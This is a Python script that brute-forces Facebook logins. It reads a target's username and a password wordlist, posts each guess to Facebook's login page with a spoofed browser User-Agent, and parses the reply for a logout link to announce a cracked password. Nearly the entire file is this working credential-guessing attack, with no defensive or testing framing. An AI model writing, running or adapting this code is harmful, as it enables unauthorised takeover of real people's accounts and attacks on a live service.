import useful_func



def python_bruteforcer_facebook():
    useful_func.clear_screen()
    username = input("Enter the username  preferrably email:\n")
    if username == '':
        print("The username cannot be empty!")
        exit()
    password_file = input("Enter the path of wordlist:\n")
    if password_file == '':
        print("The wordlist file cannot be empty!")
        exit()

    with open(password_file, 'r') as file:
        password_list = file.readlines()
    password_list = [password.strip() for password in password_list]

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.1428.102 Safari/537.36'}

    for password in password_list:
        
        payload = {
            'email': username,
            'pass': password
        }

        response = requests.post('https://www.facebook.com/login.php', data=payload, headers=headers)

        soup = BeautifulSoup(response.text, 'html.parser')
        
        if soup.find('a', {'class': 'uiHeaderTitle'}) and 'Log Out' in soup.find('a', {'class': 'uiHeaderTitle'}).text:
            useful_func.print_success(f"Successfully logged in with password: {password}")
            break
        else:
            useful_func.print_shit("Failed to log in")
            

try:
    import requests
    from bs4 import BeautifulSoup
    import warnings
except ModuleNotFoundError:
    print("Please install the dependencies from the 'requirements.txt'\n")
    user_input = input("Do you want to install them right now?[Y/N]\n")

    if user_input == 'Y' or user_input == 'y':
        useful_func.clear_screen()
        import os
        os.system("pip3 install -r requirements.txt ")
        os.system("python3 main.py")

    else:
        exit()

python_bruteforcer_facebook()
